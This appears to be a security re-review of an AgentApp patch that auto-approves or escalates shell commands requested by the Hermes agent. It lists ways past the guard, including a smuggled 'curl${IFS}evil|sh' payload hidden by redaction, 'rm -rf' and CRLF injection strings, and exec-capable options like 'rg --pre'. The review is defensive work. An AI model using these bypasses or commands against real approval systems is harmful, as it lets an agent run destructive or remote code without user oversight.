# AgentApp approvals fix2: re-review (uncommitted, on top of 6b76da3)

**Verdict: PASS-WITH-ISSUES. There are 3 must-fix items before the MacBook install; all are small.**

- **N1 is fixed as specified.** `commandRequiresUserReview` now checks `unicodeScalars` against an ASCII allowlist (`A-Za-z0-9`, space and `._/:=,@%+-`).
  - I could not find a shell-syntax string that gets past it: CR/LF/CRLF, NEL, U+2028/2029, combining and prepend marks, full-width or look-alike operators, NUL, tab, quotes, backslash, `$`/`$IFS`, globs, `~`, braces, parens, `!` and `#` are all rejected.
  - **One unverified route remains (N9).** AgentApp judges Hermes' **redacted** command, and Hermes then executes the raw one. If the redactor masks a span as `prefix...suffix`, that span can hide `;…|sh`, and the mask itself passes the allowlist.
- **N3 is essentially fixed.** Reviewer mode now runs the owner's deny/ask rules first, then the guard, then a program allowlist. Unknown programs, and send/delete/destructive operations, escalate. The residual gaps are small (rg `--pre`, `git log/diff --output=`).
- **N2 is partly fixed.** The presets are exact now and the cited examples are blocked. But it is a short denylist, so a user rule like `X *` still auto-allows exec for many programs it doesn't list. The default `read*`/`*` preset auto-allows `/bin/rm -rf …` if Hermes ever sends a `read*` action kind.
- **Three unit tests will fail, including the new N4 Stop test.** Their owner stream raises the approval command `"cmd"`. The new reviewer allowlist now escalates `"cmd"` before the reviewer is ever called.
  - The type-check can't catch this, and `swift test` has still never run.
  - The new Stop test therefore never reaches the code it claims to test.

## Scope and limits

- **No Swift was built, type-checked or run here.** This is a Linux box with no Swift toolchain. Everything below comes from reading and hand-tracing the code.
- **I could not reach the Hermes v0.21.7 source** (`_redact_approval_command`, `DANGEROUS_PATTERNS`, the approval payload fields) from this sandbox.
- **What I read:**
  - `APPROVALS-FIX2.diff`, plus the full current `Models.swift`, `AppStore.swift` (routing, reviewer and Stop), `HermesBackend.swift` (stop registry, SSE, approval parse) and `AgentApp.swift` (fixture).
  - The fixture server, and every reviewer test in `AgentAppTests.swift`.
- **Logs (consistent with each other):**
  - The build and package passed.
  - `approvals-fix2-test-typecheck.log` now records the exact `swiftc -typecheck` command and PASS. That addresses last round's complaint about an unreproducible one-liner.
  - `swift test` still aborts on `_XPCTypeBool`.
  - Codex's fixture run hit EPERM on bind.
  - **Ermes' fixture run used this binary.** The log mtime (05:38:46) is after the last source edit (05:36:51) and after the package build (05:37:57). Its output (`destructive-floor-escalated`, `req-escalate` → `deny`) is new-binary behaviour. Native and legacy both pass.
  - The SHA `93c47871…29c0` matches between `GIT-STATUS.txt` and `approvals-fix2-sha256.log`. The zip is not in this tree, so I didn't hash it.

---

## Findings, highest severity first

### T1 (HIGH for the test gate): three reviewer tests now fail. **Must fix.**

- **The cause:**
  - `TestBackend.StreamMode.approvalThenFinish` raises an approval with `command: "cmd"` (`Tests/AgentAppTests/AgentAppTests.swift:29`).
  - In reviewer mode, `reviewerMustEscalate` now escalates any program not in `reviewablePrograms` (`Models.swift:76-77`).
  - So `routeApproval` calls `askUser(..., decidedBy: "system")` at `AppStore.swift:317-318` and never calls the reviewer.
- **The failing tests:**
  - `ownerStopCancelsAndStopsInFlightReviewer` (`Tests:434-447`, **new in this pass**): `waitUntil { reviewer… contains("send") }` times out after 2 s and throws `WaitTimeout`. This is the only test for N4, and it never reaches a reviewer.
  - `reviewerEscalationFallsBackToUser` (`Tests:459-470`) expects `decidedBy == "reviewer:<id>"`, but the audit says `"system"`.
  - `reviewerApprovalRequestEscalatesAndSelfReviewIsGuarded` (`Tests:472-492`):
    - It expects a reason containing "escalated", but the reason is "Unsafe, destructive, or unparseable…".
    - It expects `approval:false` and `post` on the reviewer backend, but the reviewer is never called.
    - The nested-approval path is therefore untested.
- **Codex updated the direct `routeApproval` tests** (`:379`, `:389`, `:401`) to `cat /tmp/x`, but missed these three, which go through `send(text:)`.
- **Fix:** change the `approvalThenFinish` command at `:29` to a reviewable one, such as `cat /tmp/x`. Check that `approvalIsScopedAndClearedAtRunEnd` (ask mode) is unaffected; it should be.

### N9 (HIGH if confirmed, unverified): auto-approval judges Hermes' **redacted** command

- **What the evidence doc says:** `docs/hermes-v0.21.7-evidence.md:25-31` states that v0.21.7 runs `event["command"] = _redact_approval_command(...)` before emitting `approval.request`. AgentApp applies its rules and guard to that redacted text, and on approve Hermes runs the original.
- **Why the guard is only sound under a condition:** it holds only if redaction can never turn an unsafe string into one made entirely of `[A-Za-z0-9 ._/:=,@%+-]`.
  - Masks that contain `*`, `[` or `<` are safe, because the guard rejects them and the request falls back to ask.
  - Hermes' general redactor masks long secrets as `first6...last4`, from memory and not verified against v0.21.7.
  - `.` is allowlisted. So if an env-assignment pattern (`*_TOKEN=\S+` style) is redacted that way, the payload hides in the middle:
    - The agent sends `cat /tmp/x MY_TOKEN=aaaaaa;curl${IFS}evil|sh;bbbb`.
    - AgentApp sees `cat /tmp/x MY_TOKEN=aaaaaa...bbbb`, the default preset `cat *` auto-allows it, and Hermes executes the raw command.
- **What to do:**
  1. Read `_redact_approval_command` in v0.21.7, and say in README what it can mask.
  2. In any case, cheaply refuse automatic allow when the command contains a redaction marker (`...`, `***`, `[REDACTED]`, `<redacted>` and so on). These never occur in a command you'd want auto-approved.
- This is the same class as N1, so it belongs on the must-fix list until it is confirmed safe.

### N2r (MEDIUM): the exec denylist is short, and the `read*` preset is a broad allow

- **What works:**
  - The presets are exact now: `git status` and `git status *` (`Models.swift:26-27`).
  - git is restricted to `branch/diff/log/show/status` as `tokens[1]`, which blocks `git -c`, `-C` and `--upload-pack` before the subcommand.
  - The cited examples are blocked: `find`, `xargs`, `env`, `sh`/`bash`, `curl`, `dd`, `mv`, `python`/`python3`, `perl`, `awk`, `ssh`, `scp` as programs, plus `-c -e -d -f -t -exec -delete --data* --upload-*`.
  - Lowercasing tokens also catches `GIT`, `FIND` and `-C`/`-D`, which matters on case-insensitive APFS.
  - The default **command** presets (`git status *`, `ls *`, `cat *`) cannot exec. I could not find a string that does.
- **Still auto-allowed under a trailing-`*` user rule (`X *`):**
  - Shells, interpreters and wrappers missing from the list: `zsh /tmp/x.sh`, `dash`, `ksh`, `fish`, `node /tmp/x.js`, `ruby /tmp/x.rb`, `php`, `osascript /tmp/x.scpt`, `open /tmp/x.app`, `sudo …`, `nice`, `nohup`, `timeout`, `command`, `exec`, `eval`, `.`/`source`, `make`, `npm`/`npx` (lifecycle scripts), `brew`, `launchctl`, `crontab /tmp/x`.
  - Versioned names: `python3.12`, `perl5.34`, `gawk --file=/tmp/x.awk`.
  - Exec via options the list doesn't know: `rg --pre=/tmp/x pat .`, `tar --use-compress-program=/tmp/x -xf a.tar` (bsdtar supports it), `sort --compress-program=…`, `vim -S /tmp/x.vim`, `rsync --rsh=…`.
  - Combined short flags evade the token check: `rsync -ave …` (the token is `-ave`, not `-e`).
  - Under `git *`:
    - `git log -1 --format=%B --output=/Users/me/.zshrc` writes attacker-chosen commit text into a dotfile.
    - `git diff --output=…` writes the same way.
    - `git branch --delete x` and `git branch -m` are let through; only `-D`/`-d` is caught.
    - Config-driven exec (fsmonitor, textconv, ext-diff, `reference-transaction` hook on `git branch`) applies in an attacker-controlled repo.
  - **Mitigation:** these only matter when Hermes itself flagged the command, because unflagged commands never reach AgentApp. Most of these would not be flagged.
- **The `read*`/`*` preset (`Models.swift:30`) is a broad allow in the default set:**
  - If any approval arrives with an action kind starting `read`, every guard-passing command is auto-allowed. The kind comes from `action_kind`, else `tool_name`, else `action` (`HermesBackend.swift:278`).
  - That includes `/bin/rm -rf /Users/me`: it doesn't match `rm *`, and `rm` and `-rf` aren't on the denylists. It also includes `chmod -R 000 …`, `cp /tmp/x /Users/me/.zshrc`, and `sudo …`.
  - It is probably inert on v0.21.7 terminal approvals, but I could not verify the payload fields here.
- **The UI overclaims.** `BotEditorView.swift:39` says allow rules "reject dangerous programs/options". Users will read that as complete.
- **Fix:**
  1. Remove the `read*`/`*` preset, or give it a real command pattern. Either is cheap.
  2. Invert the guard to the same idea as `reviewablePrograms`. Auto-allow only a known read-only program set (`cat ls git head tail wc stat grep pwd`), with per-program option denials (`rg --pre`, `git --output`, `git branch` write flags). Ask for everything else.
  3. Reword the hint to say "a short list of known-dangerous programs/options".

### N4r (LOW-MEDIUM): partly fixed. The reviewer stop is likely a no-op on real Hermes for owner Stop and nested approval.

- **Fixed:**
  - Session setup now runs inside the timed child, so the timeout covers `sessionTransport` and `createSession` (`AppStore.swift:350-352`).
  - The session ID is now `agentapp_review_<uuid>` (52 chars), which settles the length concern.
  - A stream must yield `.completed`, so a truncated stream is no longer a decision (`:354-356`).
  - Session deletion is documented in README.
  - The cleanup stop runs in an unstructured `Task`, so it is no longer cancelled (`:376`).
- **The race:**
  - `stopReviewerRun` resolves the run through `HermesBackend.stopTarget`, which reads `HermesRunRegistry` (`HermesBackend.swift:113-117`).
  - The SSE task clears that registry when it is cancelled or the stream is dropped (`:229-239`).
  - **On owner Stop:** cancellation reaches the reviewer child first. Its iterator ends, `onTermination` cancels the SSE task, and that task clears the registry. Only then does `group.next()` throw and the catch schedule the `Task`. So `stopTarget` will usually return `.noActiveRun`, and nothing is POSTed.
  - **On a nested approval:** the stream is released when the child returns `.nestedApproval` (`:355`). The later `stopReviewerRun` (`:367`) races the same clear, so after the `deny` the reviewer run may keep going server-side.
  - `AppStore.stop()` has the same race, and handles it explicitly by capturing the target *before* cancelling (`:239-241`). The reviewer path doesn't.
- **Why the test can't see it:** `TestBackend.stopTarget` always returns `.serverRun("run-1")`. Even with T1 fixed, `ownerStopCancelsAndStopsInFlightReviewer` would pass whether or not the race happens.
- **Fix:** record the reviewer's `StopTarget` in the child as soon as the run starts. For example, call `stopTarget` after the first event and store the result in a small locked box. Then stop that captured target from the catch and nested paths. To test it, add a `TestBackend` mode whose `stopTarget` returns `.noActiveRun` once the stream is cancelled.
- **Nit:** the timeout path awaits a stop at `:370`, then throws into its own `catch`, which fires a second stop at `:376`. Two POSTs per timeout. Harmless (`try?`), but untidy.
- **Edge case:** `run.cancelled` maps to `.completed` (`HermesBackend.swift:281`). A reviewer run cancelled right after emitting `approve` still counts as an approve. Treat `run.cancelled` as a failure for reviewer decisions.

### N3r (LOW): reviewer-mode residuals

- **Done:**
  - Owner rules are evaluated first, and a non-allow first match asks (`AppStore.swift:313-316`).
  - The N1 guard runs before the reviewer (`:317`).
  - Programs outside `reviewablePrograms` escalate, as do unknown or display-only commands (`:309-311`).
  - Commands that reach the LLM reviewer are now limited to `cat grep head ls pwd rg stat tail wc` plus git `branch/diff/log/show/status`, all in the safe charset. That is a large improvement.
- **Residual gaps:**
  - The reviewer can still approve `rg --pre=/tmp/x …` (exec), `git log/diff --output=…` (write) and `git branch --delete/-m/--force` (ref changes).
  - An owner **deny** rule is turned into *ask* in reviewer mode instead of denying. This is conservative, but it doesn't match the rule's label.
  - The quote/backslash normalization in `reviewerMustEscalate` (`Models.swift:73`) is dead code: the guard already rejects `'`, `"` and `\`.
    - The new test's `r''m` case is caught by the guard, not by the normalization.
    - In fact every string in `reviewerHonorsOwnerRules…` (`Tests:415`) is stopped by the owner rule or the guard. None of them exercises `reviewerMustEscalate`.

### N8 side effect (LOW): display-only approvals can no longer be approved by hand

- **Fixed:** `command` now comes only from the raw `command`, and `display_command` is used only for the summary (`HermesBackend.swift:272-279`). Automation can't see the display text.
- **The side effect:** for a gateway that sends only `display_command`, `hasKnownCommand` is false. The card says "Command unknown — approval is disabled" while showing the display text (`ApprovalCard.swift:9-11`), and the user can no longer approve.
- This is probably the right call, but it is a behaviour change.
- `docs/hermes-integration.md:23` ("preferring `command` over `display_command`") is now stale.

### Test-quality notes (LOW)

- **`defaultPresetsRejectCRLFInjectionAtStoreBoundary` (`Tests:245-255`):** the `git status\r\nrm -rf ~` case asks because *no rule matches*. The CRLF character isn't a space, so `git status *` doesn't match. It never reaches the guard.
  - The `cat` case does exercise the guard.
  - The assertion holds, but for a different reason than the test name suggests.
- **Still missing:**
  - a real `MockBackend` reviewer path (README now says so);
  - an editor-level save test (documented);
  - a test that rules-mode `deny` beats reviewer mode.
- **The new tests that do pass by trace:**
  - `automaticAllowRejectsShellControl…`, including the CRLF, U+0600, U+0301, parens and backslash strings;
  - `automaticAllowRejectsDangerousProgramsAndArguments`;
  - `reviewerHonorsOwnerRules…` (8 asks, 0 sends);
  - `reviewerTimeoutIncludesSessionCreation`. The cancellation-aware sleep in `createSession` returns promptly on cancel.

---

## Status of last review's items

| Item | Status | Notes |
|---|---|---|
| **N1** | **Fixed** (as specified) | ASCII scalar allowlist with tests. No shell-syntax bypass found. The redacted-command premise is unverified (**N9**). |
| **N2** | **Partly fixed** | Exact presets. Short program and argument denylist; git subcommand allowlist. Many exec-capable programs and options still pass under `X *`. The `read*`/`*` preset remains a broad allow. The UI hint overclaims (**N2r**). |
| **N3** | **Fixed, with LOW residuals** | Owner rules, then the guard, then a program allowlist, then the reviewer. Unknown commands escalate. Residuals: `rg --pre`, `git --output`, deny→ask (**N3r**). |
| **N4** | **Partly fixed** | The timeout covers setup; short session ID; completion required; deletion documented. The reviewer stop most likely hits `.noActiveRun` on real Hermes for owner Stop and nested approval. Double stop on timeout (**N4r**). |
| **N5** | **Fixed** | The relabel is honest. `"send fixture message"` escalates through the program allowlist and the `send` keyword with `decidedBy "system"`, and the fixture now asserts that. The fixture never exercises a reviewer, and `FixtureReviewerBackend` is effectively unused. |
| **N6** | **Partly fixed** | New guard, store, timeout and Stop tests. **Three tests are broken (T1)**, including the Stop test. Mock routing and editor save are still simulated (documented). |
| **N7** | **Documented** | README Known issues covers the inferred deny at run end and lost-response ambiguity. |
| **N8** | **Fixed** | Display text never drives automation. It also disables manual approval for display-only gateways (LOW). |

## Regressions

- **Approvals (rules mode):** unchanged apart from the stricter guard. Existing persisted bots keep their old presets (`git status*`, or the even older `read*/send*/delete*`). That is harmless under the new guard, but they are not migrated.
- **Hermes Stop:** `AppStore.stop()` is untouched. The only Hermes change is approval parsing. No regression.
- **Reviewer sessions:** one per approval, never deleted (documented). Owner Stop no longer awaits a cancelled stop. The race in N4r means it still mostly doesn't stop the reviewer.
- **History, merge and persistence:** untouched (Codable unchanged).
- **Packaging:** the script is unchanged. It is still a `-dirty` build of 6b76da3, so build on the MacBook from a committed tree rather than copying the mini zip.
- **Unit tests:** T1 is a regression introduced by this pass: 3 of the reviewer tests that type-check will fail at run time.

## Must-fix before MacBook install

1. **T1:** change the `approvalThenFinish` command (`Tests:29`) to a reviewable command so the three reviewer tests reach the reviewer again. Then get `swift test` green on the MacBook. It has never run.
2. **N9:** refuse automatic allow when the command contains a redaction marker (`...`, `***`, `[REDACTED]`/`<redacted>`), *or* confirm from the v0.21.7 source that `_redact_approval_command` can't hide characters inside allowlisted output.
3. **N2r:** delete the `read*`/`*` default preset, or give it a real command pattern. Today it auto-allows `/bin/rm -rf …` for any `read*` action kind.

**Strongly recommended:**
- **N4r:** capture the reviewer `StopTarget` while the stream is live, and add a `TestBackend` mode that clears the target on cancel.
- **N2r:** turn the auto-allow denylist into an allowlist of read-only programs, block `rg --pre` and `git --output`, and reword the hint at `BotEditorView.swift:39`.

*Swift was not built, type-checked or run for this review (Linux host, no toolchain). Every claim above comes from reading and hand-tracing the code, plus the Codex and Ermes logs.*
